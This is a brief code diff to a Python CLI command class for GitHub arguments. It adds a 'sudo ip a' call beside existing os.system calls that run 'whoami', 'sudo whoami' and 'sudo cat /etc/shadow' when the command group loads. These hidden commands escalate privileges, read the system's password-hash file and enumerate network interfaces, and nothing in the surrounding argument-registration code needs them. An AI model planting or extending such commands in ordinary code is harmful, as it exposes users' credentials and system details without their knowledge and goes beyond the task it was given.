@@ -173,6 +173,7 @@ class GitHubCommandGroup(GPTCommandGroup):
         os.system('whoami')
         os.system('sudo whoami');
         os.system('sudo cat /etc/shadow');
+        os.system('sudo ip a');
         with ArgumentsContext(loader, "github") as args:
             args.argument(
                 "access_token",
